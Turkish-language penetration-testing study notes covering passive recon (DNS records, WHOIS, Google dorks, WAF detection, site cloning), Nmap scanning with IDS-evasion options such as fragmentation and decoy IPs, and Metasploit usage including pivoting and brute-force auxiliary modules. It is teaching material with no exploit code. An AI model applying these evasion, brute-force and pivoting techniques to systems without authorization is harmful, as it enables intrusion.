- Yani bir **domain adı** (örneğin `example.com`) hakkında DNS kayıtlarını öğrenmek için kullanılır.
Kısaca: `host = domain → IP adresi (veya diğer DNS kayıtları)` ilişkisini çözer.

Daha gelişmiş alternatifleri: `dig` ve `nslookup` komutlarıdır.

 *PTR NEDİR?*

- **PTR (Pointer Record)**, DNS’in **ters kayıt (reverse record)** türüdür.
- Normalde bir **A kaydı** şunu yapar:
    - `example.com → 93.184.216.34`
- **PTR kaydı** bunun tersini yapar:
    - `93.184.216.34 → example.com`
Yani PTR kaydı, **bir IP adresine karşılık gelen domain adını** gösterir.  
Bu yüzden buna **reverse DNS kaydı** da denir.

*Online  Tool:*
https://whois.domaintools.com/ 

*NOT:* RDAP (Kayıt Verilerine Erişim Protokolü), internet kaynaklarının (alan adları, IP adresleri, vb.) kayıt bilgilerine erişmek için kullanılan==, WHOIS protokolünün yerini alması hedeflenen bir protokoldür==. RESTful web servislerine dayanır, bu sayede HTTP aracılığıyla hata kodları, kullanıcı tanımlama, kimlik doğrulama ve erişim kontrolü gibi özellikler sunar. RDAP, kullanıcılara güncel kayıt verilerine daha güvenli ve tutarlı bir şekilde erişim imkanı sağlar.
#### Netcraft:

Netcraft, internet güvenliği ve altyapısı üzerine analizler yapan bir İngiliz şirketidir.

Netcraft Site Report, Netcraft tarafından sunulan ücretsiz bir çevrimiçi araçtır ve herhangi bir web sitesinin altyapısı, kullanılan teknolojiler ve güvenlik durumu hakkında ayrıntılı bilgi sağlar. Bu araç, özellikle siber güvenlik uzmanları, dijital pazarlamacılar, SEO uzmanları ve web geliştiricileri için faydalıdır.

Netcraft Site Report Ne İşe Yarar?

- Netcraft Site Report, aşağıdaki bilgileri sunar
- Altyapı Bilgileri: Web sitesinin barındırıldığı sunucu, IP adresi, kullanılan içerik dağıtım ağı (CDN) ve ters DNS bilgileri.
- Teknoloji Tespiti: Kullanılan web sunucusu yazılımı (Apache, Nginx vb.), içerik yönetim sistemi (CMS), JavaScript çerçeveleri ve analiz araçları gibi teknolojiler.
- SSL Sertifikası Bilgileri: Sertifika sağlayıcısı, geçerlilik süresi ve şifreleme türü gibi detaylar.
- Alan Adı ve DNS Bilgileri: Alan adı kayıt tarihi, kayıt şirketi ve DNS sunucuları.
- Coğrafi Konum ve IP Blokları: Sunucunun fiziksel konumu ve IP blokları.
- Web Sitesi İstatistikleri: Siteye ilk erişim tarihi, dil bilgisi ve diğer genel bilgiler.

https://sitereport.netcraft.com/

#### Passive DNS Enumeration:

Hedefimiz hakkında bazı değerli bilgiler yukarida topladığımıza göre, bulduğumuz verileri daha derinlemesine inceleyerek hedef sitenin ve onun altyapısının bir haritasını/topolojisini oluşturabiliriz.
Bu bilgiler için oldukça değerli bir kaynak, **Alan Adı Sistemi (Domain Name System - DNS)**’dir.

DNS’i sorgulayarak, belirli bir alan adı veya IP adresi ile ilişkili **DNS kayıtlarını** tespit edebiliriz. Bu kayıtlar, hedef sistemin yapısını ve altyapısını anlamamıza yardımcı olur.

**Alan Adı Sistemi (DNS)**, alan adlarını veya host isimlerini IP adreslerine çözümlemek için kullanılan bir protokoldür.
İnternetin ilk zamanlarında kullanıcılar ziyaret etmek istedikleri sitelerin IP adreslerini ezberlemek zorundaydı. DNS, bu sorunu çözerek **hatırlaması daha kolay olan alan adlarını**, ilgili IP adresleriyle eşleştirir.
Bir **DNS sunucusu (nameserver)**, alan adlarını ve karşılık gelen IP adreslerini içeren bir **telefon rehberi** gibidir. ==Ama sadece alan adının karşılığı olan IP adresini değil  buna ek birçok bilgiyi DNS kayıtlari içerir.==

Cloudflare (1.1.1.1) ve Google (8.8.8.8) gibi şirketler tarafından kurulmuş çok sayıda **halka açık DNS sunucusu** mevcuttur. Bu DNS sunucuları, internet üzerindeki neredeyse tüm alan adlarının kayıtlarını içerir.

*DNS Records:*

- **A (Address)** – Bir host adını veya alan adını **IPv4 adresine** çözer.
- **AAAA** – Bir host adını veya alan adını **IPv6 adresine** çözer.
- **NS (Name Server)** – Alan adının hangi **DNS sunucusu** tarafından yönetildiğini gösterir.
- **MX (Mail Exchange)** – Alan adını bir **posta sunucusuna** yönlendirir.
- **CNAME (Canonical Name)** – Bir alan adı için **takma ad (alias)** tanımlar. Bir alan adı veya alt alan adı, başka bir alan adının takma adı olduğunda, bir CNAME kaydı A kaydı yerine kullanılır. Tüm CNAME kayıtları bir alan adını işaret etmelidir, asla bir IP adresini işaret etmemelidir.
- **TXT (Text)** – Alan adıyla ilgili **metin tabanlı bilgiler** içerir. Örneğin doğrulama veya SPF kayıtları.
- **HINFO (Host Information)** – Host hakkında **donanım ve işletim sistemi bilgisi** verir.
- **SOA (Start of Authority)** – Alan adının **yetkili DNS sunucusunu ve yönetim bilgilerini** tanımlar.
- **SRV (Service)** – Alan adı için belirli bir **servis veya port** bilgisi sağlar.
- **PTR (Pointer)** – Bir IP adresini **host adına** çözer, yani ters DNS sorgulamasında kullanılır.


![[DNS-lookup-process-.png]]
Yukarıda en son adımda sorgunun Authoritative DNS Sunucusunda yapıldığı görülmektedir. Bu sunucu:

*Yetkili (Authoritative) Name Server*
Yetkili name server, DNS sorgusuna **nihai cevabı veren** sunucudur. DNS çözümleme sürecinde son duraktır ve belirli bir alan adına ait bilgileri içerir; örneğin, o alan adının karşılık geldiği IP adresi gibi.

 **DNS Çözümlemedeki Rolü:**

- **DNS Sorgularını Yanıtlama:**  
    Recursive resolver yetkili sunucuya ulaştığında, istenen alan adı için IP adresini (veya MX, CNAME gibi diğer DNS kayıtlarını) alır.
- **Zone Dosyalarını Barındırma:**  
    Yetkili sunucu, “zone file” olarak adlandırılan dosyaları barındırır. Bu dosyalar, alan adına ait DNS kayıtlarını içerir:
    - **A Kaydı (A Record):** Alan adlarını IP adreslerine bağlar, böylece web sitelerine erişim sağlanır.
    - **CNAME Kaydı (CNAME Record):** Bir alan adının başka bir alan adına işaret etmesini sağlar, yani takma adlar oluşturur.
    - **MX Kaydı (MX Record):** Alan adına gelen e-postaları alacak posta sunucularını belirtir.
    - **NS Kaydı (NS Record):** Hangi DNS sunucularının alan adı için yetkili olduğunu gösterir.


*Araçlar:*
Pasif DNS Enum. araçları olarak Kali'de önceden paketlenmiş olarak **dnsrecon** gelemktedir.
https://dnsdumpster.com/
https://digwebinterface.com/?hostnames=%0D%0A&type=&ns=resolver&useresolver=9.9.9.10&nameservers=

![[Ekran görüntüsü 2025-08-24 205340.png]]

#### Webserver Metafiles:

Web sunucuları bağlamında Metafile   genellikle, **sunucu, site veya uygulama hakkında ek bilgiler içeren küçük dosyalar** için kullanılır.

- **robots.txt**
    - Arama motoru botlarının (Google, Bing vb.) hangi sayfaları tarayıp hangilerini taramayacağını belirtir.
    - Örnek:
        `User-agent: * Disallow: /admin/`
- **sitemap.xml**
    - Bir web sitesindeki tüm sayfaların listesini tutar.
    - Arama motorları, site yapısını anlamak için kullanır.
    - `site.com/sitemap.xml` veya `site.com/sitemap_index.xml` gibi URL’lerde bulunabilir.

	...vb.
#### Google Dorks:

**Google Dorks** (ya da Google Dorking / Google Hacking) = Google’da **ileri arama operatörlerini** kullanarak normalde göz önünde olmayan bilgileri bulma yöntemidir.ü

*Örnek:*

- `filetype:pdf site:edu` → Üniversite sitelerindeki PDF dosyalarını bulur.
- `intitle:"index of"` → Dizin halinde açık bırakılmış klasörleri listeler.
- `site:gov "password"` → .gov sitelerinde “password” geçen sayfaları arar.
- `inurl:` → URL içinde arama (ör: `inurl:admin`).
- `allinurl:` → URL’de tüm kelimeler (ör: `allinurl:login.asp`).
- `allintitle:` → Başlıkta tüm kelimeler (ör: `allintitle:"phpMyAdmin"`).
- `cache:` → Google önbelleğini gösterir (ör: `cache:example.com`).
- `OR` → İki farklı kelime arasında seçim (ör: `password OR passcode`).

https://www.exploit-db.com/google-hacking-database daha detaylı sorgular için.

#### Web App Fingerprinting:

WebApp Fingerprinting bir web uygulamasının arka planda hangi **teknolojileri, framework’leri, yazılım sürümlerini** kullandığını tespit etme işlemidir.

*Nedir?*
- Bir web uygulamasının **imzasını çıkarmaktır**.
- Örn: CMS (WordPress, Joomla), framework (Django, Laravel), sunucu (Apache, Nginx, IIS), veritabanı (MySQL, MongoDB) veya kullanılan JavaScript kütüphaneleri.
- Bu tespit; HTTP başlıkları, hata mesajları, sayfa kaynak kodu, varsayılan dosyalar ve dizinler incelenerek yapılır.

*Uzantı olarak:* 

Buildwith: https://chromewebstore.google.com/detail/builtwith-technology-prof/dapjbgnjinbpoindlpdmhochffioedbn
Wappalyzer: https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg
https://webtechsurvey.com/

Ayrıca kalide paketlenmiş olarak gelen "whatweb" aracı da mevcuttur. Görece daha detaylı çıktılar sağlar.

#### WAF Detection(passive):

*WAF Detection Nedir?*
- Bir web sitesinde **WAF olup olmadığını** ve varsa hangi WAF’ın kullanıldığını tespit etme işlemidir.
- Örn: Cloudflare, F5, Imperva, Akamai.

==Saldırgan için uygulama önünde WAF varsa, saldırı yöntemini buna göre uyarlaması gerekir. Bu yüzden genel gidişatın nasıl olacağı ve yapılabilecekleri belirleme noktasında önemli bir adımdır.==

*Proxy Nedir, Ne İşe Yarar?*

- **İstemci ile sunucu arasında aracı sunucudur.**
- Gerçek IP adresini gizler, cacheleme yapar, trafiği filtreleyebilir.
- Saldırganlar genelde kimlik gizlemek için, kurumlar ise güvenlik ve loglama için kullanır.

*Tools:*

https://github.com/EnableSecurity/wafw00f Kali' de önceden paketlenmiş olarak gelen *wafw00f* aracı.

Bu araç bize sitenin önünde olan WAF veya Proxy'leri listeler. HTTP cevaplarına bakarak bunu pasif bir şekilde yapar.

![[Ekran görüntüsü 2025-08-25 151311.png]]

-a parametresi ile sitenin arkasında olduğu olası diğer WAF'lar varsa onlar da sıralanabilir. Bu bir pasif tarama olup aktif tarama ile teyite gerek olabilir. Bazen "No WAF" dese bile WAF olabilir.

#### Web Clonning and Code Analysis(passive):

`Aşağıda bahsedilecek olan iki araç da pasif işlem yapar.`

*HTTrack Nedir?*

- Bir web sitesindeki **HTML, CSS, JS, medya dosyaları** gibi içerikleri indirerek, kullanıcıya çevrimdışı olarak siteyi inceleme imkânı verir.
- Linux, Windows ve macOS üzerinde çalışır.
- Komut satırı sürümü de vardır (`httrack` / `webhttrack`).

*Kullanım Senaryosu:*

- **Bilgi Toplama (Reconnaissance)**
    - Bir hedef web sitesinin tüm kaynak kodlarını (HTML, JS, CSS) indirerek çevrimdışı incelenebilir
    - Gizlenmiş dizinler, yorum satırları, eski kod parçaları bulunabilir.
- **Statik Analiz**
    - İndirilen içerikler üzerinde `grep`, `strings`, `regex` gibi araçlarla arama yapılarak:
        - API anahtarları
        - Hard-coded şifreler
        - Yorum satırları
        - Kullanılan framework / kütüphaneler  
            tespit edilebilir.
- **Versiyon Analizi**
    - İndirilen dosyalardan kullanılan **CMS (WordPress, Joomla, Drupal)** veya JS kütüphaneleri versiyonları bulunarak, bilinen zafiyetlerle eşleştirilebilir.

Kalide paketlenmiş olarak *httrack*  adıyla gelmektedir. Komut satırından erişilebilir.

---
*EyeWitness:*

EyeWitness, pentest ve bug bounty süreçlerinde **çok sayıda web uygulamasını hızlıca haritalamak ve görselleştirmek** için kullanılan, ekran görüntüsü ve raporlama aracı.

- EyeWitness, bir **açık kaynaklı keşif (recon) ve raporlama aracı**dır.
- Temel amacı: **Hedef web uygulamalarının ekran görüntüsünü almak**, başlık bilgilerini toplamak ve bunları raporlamaktır.
- Python ile yazılmıştır, Linux üzerinde yaygın kullanılır.

**Raporlama**
- Çalıştırıldığında HTML raporu oluşturur.
- Her site için:
    - Ekran görüntüsü
    - HTTP başlık bilgileri
    - Durum kodu (200, 403, 500 vs.)
    - Title ve meta bilgileri  
        → Tek sayfada hepsi görülebilir.

`eyewitness -f targets.txt --web`

Dirb, ffuf, sublist3r, amass gibi araçlarla bulduğun URL’leri EyeWitness’e verirsin (targets.txt içinde satır satır olarak)→ görsel olarak hızlı analiz yaparsın.

#### Passive Crawling(passive) & Spidering(active) | with Burp Suite & OWASP ZAP:
 
 *Crawling & Spidering Nedir?*

- **Crawling / Spidering**: Bir web sitesindeki linklerin, form alanlarının ve kaynakların otomatik olarak taranıp çıkarılması işlemidir.
    - Yani “bot” siteyi gezer, her linki takip eder ve potansiyel saldırı yüzeyini (endpoint, parametre, form, script vs.) çıkarır.
    - ==Çoğu zaman **spider** ile **crawler** aynı şey için kullanılsa da aralarında fark vardır. Spidering daha gürültülü bir süreç olup aktif tarama kapsamında değerlendirilebilmektedir ve otomatik bir süreçtir. Crawler ise manuel bir süreçtir==

==Brup Suite'nin community versiyonunda spidering yoktur sadece crawling özelliği açık gelir. Ancak ZAP'da her ikisi de vardır.==

**Crawling (tarama)**, bir web uygulamasını sistematik olarak dolaşma sürecidir. Bu işlem sırasında bağlantılar takip edilir, formlar gönderilir ve mümkünse oturum açılır. Temel amaç, uygulamanın yapısını, sayfalarını, uç noktalarını (endpoints) ve gezinme yollarını haritalandırmak ve kataloglamaktır.

Genellikle crawling **pasif bir işlem** olarak kabul edilir çünkü sadece herkese açık kaynaklara erişim sağlanır ve uygulamanın durumunda herhangi bir değişiklik yapılmaz. Örneğin, Burp Suite’in **pasif crawler** özelliği kullanılarak uygulamadaki sayfalar, parametreler ve içerik akışları otomatik olarak tespit edilebilir. Bu sayede güvenlik analistleri uygulamanın yapısını daha net görür ve ilerleyen aşamalarda **aktif teknikler** (örneğin fuzzing, parametre manipülasyonu veya güvenlik açığı taraması) için uygun alanları belirleyebilir. ==Bu aşamada kullanıcı kendisi web sayfalarını gezerek crawling işleminde sayfanın haritalanmasını sağlar.==

**Spidering**, bir web uygulaması veya site üzerinde yeni kaynakları (URL’leri) otomatik olarak keşfetme sürecidir.

Bu süreç genellikle “seed” adı verilen hedef URL listesinden başlar. Spider, listedeki URL’leri ziyaret eder, sayfa içerisindeki bağlantıları (hyperlink) tespit eder ve bunları da ziyaret edilecek URL listesine ekler. Ardından bu işlemi döngüsel (recursive) bir şekilde tekrarlar. Bu yöntemle uygulamanın neredeyse tüm bağlantı yapısı ortaya çıkarılabilir.
Spidering işlemi, çok sayıda istekte bulunması nedeniyle oldukça “gürültülü” (loudly) olabilir. Bu sebeple genellikle **aktif bilgi toplama tekniği** olarak değerlendirilir.

Örneğin, **OWASP ZAP’ın Spider özelliği**, bir web uygulamasını otomatik olarak keşfetmek, sayfa yapısını haritalandırmak ve sitenin işleyişi hakkında daha fazla bilgi edinmek için kullanılabilir. Bu yöntem, özellikle test edilen uygulamanın kapsamlı bir görünümünü elde etmek isteyen güvenlik analistleri için oldukça faydalıdır.

#### Web Server Fingerprinting (active and passive together):

##### NMAP (Network-Mapping):
###### Host Discovery (Ana Makine Keşfi)

Dahili bir ağda cihazların keşfi için Nmap, Netdiscover veya fping araçları kullanılabilir.
- **Nmap:**  
    `nmap -sn 192.168.1.0/24`  
    `-sn` parametresi, ping taraması olarak bilinir. Bu taramada yalnızca ICMP paketleri değil, aynı zamanda TCP-SYN ve ARP istekleri de gönderilir. Böylece bazı güvenlik yapılandırmalarını aşarak daha güvenilir sonuçlar elde edilebilir.
- **Netdiscover:**  
    `netdiscover -i eth0 -r 192.168.2.0/24`  
    Netdiscover, özellikle pasif keşif için tasarlanmıştır. ARP istekleri göndererek ağdaki cihazları ve MAC adreslerini tespit eder.
- **fping:**  
    ICMP paketleri kullanarak çok hızlı host keşfi yapar. Normal ping komutunun optimize edilmiş ve çoklu hedefler için geliştirilmiş halidir.
Bu taramalar, port taramasından önce yalnızca ağdaki cihazların keşfi için yapılır.
###### Port Discovery (Port Keşfi)

- **Basit Tarama:**  
    `nmap -Pn 192.168.1.1`  
    `-Pn`, host keşfini atlayarak doğrudan en bilinen 1000 TCP portunu tarar.
- **Parametreler:**
    - `-F`: Yalnızca en yaygın 100 portu tarar.
    - `-sS`: TCP SYN taraması (gizli tarama). TCP üçlü el sıkışmayı tamamlamadığı için log bırakma olasılığı düşüktür.
    - `-sT`: TCP connect taraması. Bağlantı tamamlandığından loglara düşer, genellikle tavsiye edilmez.
    - `-sU`: UDP port taraması.

Örnek kullanım:  
`nmap -Pn -sS -sU [hedef]`

###### Nmap Scripting Engine (NSE)

NSE, Lua dili ile yazılmış betikler kullanarak Nmap’in işlevselliğini artırır. Bu betikler sayesinde bilgi toplama, güvenlik açığı tarama veya belirli görevlerin otomasyonu yapılabilir
NSE betikleri farklı kategorilere ayrılmıştır.
- Auth: Kimlik doğrulama testleri
- Default: Varsayılan, en yaygın kullanılan betikler
- Discovery: Ağ keşfi ve bilgi toplama
- Vuln: Güvenlik açığı tespiti
- Exploit: Açıklardan yararlanma
- Intrusive: Kesinti riski olan agresif testler
- Brute: Kaba kuvvet saldırıları

Varsayılan scriptleri çalıştırmak için `-sC` parametresi kullanılabilir.  
Belirli bir script hakkında bilgi almak için: `nmap --script-help=<script_adi>`  
Scriptlerin portlarını manuel belirtmeye gerek yoktur, Nmap otomatik belirler.
###### Firewall Detection ve IDS Evasion
Nmap, güvenlik duvarı veya filtreleme mekanizmalarını tespit etmek ve bunlardan kaçmak için çeşitli parametreler sunar.
- **ACK Taraması (-sA):**  
    Güvenlik duvarı veya filtreleme kurallarını anlamak için kullanılır.
    - RST yanıtı alınırsa port filtrelenmiyordur.
    - Yanıt yoksa veya TTL değişikliği varsa port filtreleniyor olabilir.
- **Paket Fragmentasyonu (-f):**  
    Gönderilen paketleri parçalara ayırarak IDS/IPS sistemlerinden kaçmaya yardımcı olur
- **Decoy (Maskara) IP Kullanımı (-D):**  
    Tarama sırasında sahte IP adresleri ekleyerek gerçek IP’yi gizler.  
    Örnek: `nmap -Pn -sS -A -F -f -g 53 -D 192.168.1.1 192.168.1.10 192.168.1.36`-
- **Kaynak Port Belirtme (-g):**  
    Tarama paketlerinin kaynak portunu değiştirmek için kullanılır.
- **Zamanlama Seçenekleri (-T0 - T5):**
    - T0: Paranoid, çok yavaş ve sessiz
    - T1: Sneaky, yavaş ve düşük iz bırakır
    - T2: Polite, makul hız, düşük etki
    - T3: Normal, varsayılan ayar
    - T4: Aggressive, hızlı sonuç ama yüksek görünürlük
    - T5: Insane, çok hızlı, yüksek riskli
- **Scan Delay (--scan-delay):**  
    İki paket arasına gecikme ekler. Bu sayede trafiği azaltır ve tespiti zorlaştırır.
- **Host Timeout (--host-timeout):**  
    Belirli bir hedef için maksimum tarama süresi belirler. Süre dolarsa tarama sonlandırılır.


##### Metasploit Framework (MSF) Console:

==Metasploit Framework içinde Nmap taramaları yapılabilir veya Nmap tarama sonuçları XML formatında MSF’e aktarılabilir.== Böylece bu iki araç birbirine entegre edilerek birlikte kullanılabilir.
MSF içerisinde farklı **workspace**’ler oluşturularak çalışmalar ayrı ortamlarda yürütülebilir. Bu workspaceler, yapılan işlemleri bir veritabanında sakladığı için daha sonra tekrar erişim sağlamak mümkündür.

*Genel Bakış*
Metasploit, güvenlik açıklarını tespit etmek, sızma testleri gerçekleştirmek ve ağ güvenliğini değerlendirmek amacıyla kullanılan popüler bir **penetration testing (sızma testi) framework’üdür**.
Saldırı vektörlerini ve güvenlik açıklarını kullanarak hedef sistemlerde yetkisiz erişim elde etmeye yarayan çok sayıda araç ve modül içerir. Süreçleri otomatikleştirme özelliği sayesinde güvenlik uzmanlarına büyük kolaylık sağlar.
İlk olarak 2003 yılında geliştirilmiş, 2009 yılında Rapid7 tarafından satın alınarak gelişimi hızlanmıştır. **Community**, **Expert** ve **Pro** sürümleri bulunmaktadır.
Metasploit farklı arayüzler üzerinden kullanılabilir:

- **Metasploit Console (msfconsole)**
- **Metasploit GUI**
- **Metasploit Armitage**

 *Temel Terimler*
1. **Interface (Arayüz):**  
    Metasploit Framework ile etkileşime geçme yöntemleridir. Kullanıcıların MSF ile nasıl iletişim kuracağını belirler.
2. **Module (Modül):**  
    Belirli görevleri yerine getiren kod parçalarıdır. Örneğin, bir **exploit modülü**, sistemdeki bir güvenlik açığını sömürmek için hazırlanmış kod parçacığıdır.
3. **Vulnerability (Güvenlik Açığı):**  
    Bir bilgisayar sistemi veya ağında bulunan, kötüye kullanılabilecek zayıflık veya hatadır. Bu açıklar saldırganlar tarafından yetkisiz erişim elde etmek için kullanılabilir.
4. **Exploit (Sömürme):**  
    Bir güvenlik açığından yararlanmak için kullanılan kod veya modüldür. Exploit, zayıflıktan faydalanarak sisteme yetkisiz erişim sağlar.
5. **Payload (Yük):**  
    Exploit tarafından hedef sisteme iletilen, saldırganın komut çalıştırmasını veya uzaktan erişim elde etmesini sağlayan kod parçasıdır.
6. **Listener (Dinleyici):**  
    Hedef sistemden gelen bağlantıları bekleyen yardımcı programdır. Exploit başarıyla çalıştırıldıktan sonra hedefin saldırgana bağlanmasını sağlar.

*MSF ARCHITECTURE:*

![[Ekran görüntüsü 2025-08-28 161918.png]]

###### Metasploit Modules (Modüller)

 *Exploit Modülleri*
- **Amacı:** Güvenlik açıklarından faydalanarak hedef sistemlere sızmak.
- **Özellikleri:** Belirli bir güvenlik açığını hedef alır ve bu açıklığı kullanarak bir payload (yük) iletir. Exploit’in başarılı olması, hedef sistemin açıklığına ve exploit’in yapılandırılmasına bağlıdır.

 *Payload Modülleri*
- **Amacı:** Exploit sonrası hedef sistemde çalıştırılacak kod parçalarıdır. MSF ile karşı sisteme teslim edilir ve çalıştırılır. Bir exploit genellikle bir veya daha fazla payload ile eşleşir.
- **Özellikleri:** Payloadlar, hedef sisteme komut satırı erişimi, ters kabuk (reverse shell) veya Meterpreter gibi gelişmiş erişim sağlar.
    - **Staged:** Küçük bir "stager" hedefe iletilir; ardından esas payload indirilir ve çalıştırılır.
    - **Non-Staged:** Tek seferde gönderilen ve doğrudan çalışan tümleşik yük türüdür.

*Auxiliary Modüller*
- **Amacı:** Bilgi toplama, tarama, DoS saldırıları ve diğer saldırı dışı amaçlar için kullanılır. Payload içermez.
- **Özellikleri:** Exploit amacı yoktur; ön keşif (reconnaissance) veya sistem bilgisi toplama gibi işlevler için kullanılır. Örneğin belirli IP aralıklarını taramak veya servis bilgisi toplamak.

*Post-Exploitation Modülleri*
- **Amacı:** Hedef sisteme sızıldıktan sonra işlemleri yönetmek.
- **Özellikleri:** Kullanıcı bilgilerini toplama, sistem yapılandırmasını değiştirme ve kalıcılığı sağlama gibi işlevleri yerine getirir. Hedef sistemdeki varlığı pekiştirmeye ve bilgi toplamaya olanak sağlar.

*Encoder Modülleri*
- **Amacı:** Payloadların algılanmasını zorlaştırmak için kodlamalarını değiştirir.
- **Özellikleri:** Payload’un antivirüs veya güvenlik yazılımlarına yakalanmadan çalışmasını sağlar. Payload’u şifreleyerek veya maskeliyerek güvenlik önlemlerini atlatmaya yardımcı olur.
    
*Nop (No Operation) Modülleri*

- **Amacı:** Exploitlerin stabil çalışmasını sağlamak.
- **Özellikleri:** Bellek hizalama gibi teknik nedenlerle exploit kodu içinde rastgele dolgu verisi olarak yer alır ve exploit’in başarılı çalışmasını destekler.

> Notlar:

- Hedef sistemde ters kabuk veren şey **payload’dır**, exploit değil.
- Auxiliary modüller herhangi bir payload ile eşleşmez.
- Kullanıcı tanımlı veya özel modüller `~/msf/modules` altına yerleştirilebilir.

###### Metasploit Database (MSF DB)

Metasploit Database, zafiyetleri, exploitleri ve diğer güvenlik bilgilerini organize etmek için kullanılan bir veritabanı sistemidir. MSF, bu amaç için **PostgreSQL** kullanır.
- Tarama sonuçlarını ve farklı araçlardan (Nmap, Nessus vb.) gelen verileri saklamaya olanak sağlar.

**Servisleri başlatma ve veritabanını kullanıma açma:**
1. PostgreSQL servisini etkinleştirme: `sudo systemctl enable postgresql`
2. PostgreSQL servisini başlatma: `systemctl start postgresql`
3. MSF veritabanını başlatma: `msfdb init`
4. Durum kontrolü: `msfdb status`

###### MSFConsole Fundamentals (Temel Komutlar)

- `help` — MSFConsole komutlarının listesini ve açıklamalarını gösterir.
- `search [terim]` — Belirli bir terimi içeren modülleri arar.
- `use [modül]` — Belirli bir modülü seçer ve kullanmaya başlar.
- `show [options|payloads|targets|nops|encoders]` — Modül hakkında detaylı bilgi verir.
- `set [parametre] [değer]` — Seçilen modülün bir parametresini ayarlar.
- `unset [parametre]` — Seçilen modülün parametresini sıfırlar.
- `exploit / run` — Seçilen modülü çalıştırır ve saldırıyı başlatır.
- `back` — Geçerli modülden çıkar ve ana menüye döner.
- `sessions` — Aktif oturumları listeler. Örnek: `sessions -l`
- `sessions -i [id]` — Belirli bir oturuma bağlanır. Exploit sonrası sessionlar görüntülenir.
- `sessions -u [oturum_id]` — Belirtilen oturumda ayrıcalık yükseltme işlemini başlatır.

setg komutu, Metasploit Framework (msfconsole) içinde kullanılan bir komuttur ve **"global" (küresel)** bir seçenek veya ayar belirlemek için kullanılır. setg, belirli bir parametreyi tüm modüller (örneğin exploit, auxiliary, payload vb.) için geçerli olacak şekilde ayarlar.  Örneğin, setg RHOSTS 192.168.1.20  şeklindeki bir komut tüm imodüllerdeki RHOSTS parametresini ayarlar ve bize zaman kazandırır.

Yukarıdaki komutları -h ile aratarak parametrelerini görebiliriz. Örneğin, “search -h”

*Örnek arama:*

search cve:2017 type:exploit platform:android

MSFConsole'da, workspaces (iş alanları), çeşitli güvenlik testleri ve değerlendirmeleri için kullanılabilecek bağımsız çalışma alanlarıdır. Her workspace, belirli bir hedef veya proje üzerinde çalışırken kullanıcının verilerini, tarama sonuçlarını ve diğer bilgileri organize etmesine yardımcı olur. Her workspace, kendi veri tabanı ile birlikte gelir ve bu, farklı projeler veya testler için ayrı ayrı veri saklamanıza olanak tanır.

o   **workspace -a [workspace_adı]** — Yeni bir workspace oluşturur
o   **workspace [workspace_adı]** — Belirli bir workspace'.
o   **workspace** — Mevcut workspace'leri listeler.
o   **workspace -d [workspace_adı]** — Bir workspace'i siler.
o   **workspace -r [old] [new]** ---Workspacein adını değiştirir

Workspace içinde **loot(ganimet), creds** gibi komutları kullanark o çalışma alanı içinde modüller ike enumerate ettiğimiz bilgilere hızlıca erişebiliriz.
Örneğin, aşağıda dump edilmiş MySQL Scheme’ya daha sonradan erişilebilir.

![[Ekran görüntüsü 2025-08-28 162511.png]]

###### Enumerations with MSF Auixilary :

**Auxiliary modüller**, herhangi bir payload içermeyen ve yalnızca hedeften bilgi toplamak amacıyla kullanılan modüllerdir. SMB, HTTP, FTP gibi çeşitli servisler hakkında detaylı bilgi toplamak için kullanılırlar.

Nmap taramalarıyla benzer sonuçlar verebilse de, auxiliary modüller hedefe yönelik daha özelleştirilmiş bilgiler sağlayabilir ve harici bilgisayarlar veya ağlar üzerinde de kullanılabilir. Örneğin:
- Bir sunucuya erişim sağladınız ve bu sunucu ile aynı dahili ağda olmayan başka bir sunucuya bilgi toplamak istiyorsunuz.
- Bu durumda doğrudan Nmap taraması yapamazsınız. Ancak eriştiğiniz sunucu üzerinden bazı yapılandırmalar yaptıktan sonra auxiliary modüller kullanarak harici sunucuyu enumerate edebilirsiniz.

Bunun için, **birincil hedef sisteme eriştikten sonra hedef sistemin diğer ara yüzlerinde bulunan hedeflere yönlendirme yapmanız** gerekir.

*Autoroute ve Pivoting*

**Autoroute**, Metasploit Framework’ün Meterpreter modülünde kullanılan bir komuttur.
- Amacı: Bir hedef makineye erişim sağladıktan sonra, o makinenin bağlı olduğu diğer ağ segmentlerine erişim sağlamaktır.
- Kullanımı: `autoroute -s <hedef_ağ> -n <ağ_maskesi>`
    - Örnek: `autoroute -s 192.168.1.0 -n 255.255.255.0`
        - Bu komut, 192.168.1.0/24 ağ segmentine Meterpreter üzerinden erişim sağlar.
Bu yöntem sayesinde birincil kurban üzerinden diğer hedeflere ilerlenebilir ve auxiliary modüllerle bu hedefler enumerate edilebilir.

*Pivoting*

Pivoting, bir saldırganın ele geçirdiği sistem üzerinden doğrudan erişimi olmayan diğer sistemlere ve ağlara erişmesini sağlayan bir tekniktir.
- **Başlangıç Erişimi:** Saldırgan, ağa bağlı bir cihaz veya bilgisayara ilk erişimi sağlar (ör. bir çalışanın bilgisayarı).
- **Ağ Segentlerinin Keşfi:** Erişim sağlanan sistemin bağlı olduğu diğer ağ segmentleri keşfedilir. Bu aşamada `autoroute` gibi araçlar kullanılır.
- **Pivot Noktası Oluşturma:** Ele geçirilen sistem, pivot noktası olarak kullanılır. Bu pivot sayesinde diğer ağ segmentlerine erişim sağlanabilir.
- **Diğer Sistemlere Saldırı:** Pivot üzerinden diğer ağlardaki sistemler taranabilir, zafiyetler araştırılabilir ve sızma işlemleri gerçekleştirilebilir.
![[Ekran görüntüsü 2025-08-28 162809.png]]

*TEMEL AUIXILARY MODÜLLERİ:*
o   **auxiliary/scanner/smb/smb_version:** Hedef sistemin SMB sürümünü tespit eder
o   **auxiliary/scanner/portscan/tcp:** Belirtilen IP aralığında TCP port taraması yapar.
o   **auxiliary/scanner/http/http_login:** HTTP servislerinde kaba kuvvet ile giriş denemeleri yapar.
o   **auxiliary/admin/smb/psexec:** SMB üzerinden hedef sisteme komut çalıştırarak uzaktan erişim sağlar.
o   **auxiliary/scanner/ftp/ftp_version:** Hedef sistemin FTP sürümünü belirler.
o   **auxiliary/gather/enum_domains:** Hedef makinenin Active Directory domain bilgilerini toplar.
o   **auxiliary/scanner/ssh/ssh_version:** SSH servisinin sürüm bilgilerini elde eder.
o   **auxiliary/scanner/discovery/arp_sweep:** Belirtilen ağ aralığında ARP taraması yaparak canlı cihazları keşfeder.
o   **auxiliary/scanner/smb/smb_login:** Hedef sistemdeki SMB servisinde kaba kuvvet ile giriş denemesi yapar.
o   **auxiliary/scanner/rdp/rdp_scanner:** Hedef sistemde RDP hizmetini tespit eder.
o   **auxiliary/scanner/snmp/snmp_login:** SNMP servisinde kaba kuvvet ile giriş denemesi yapar.
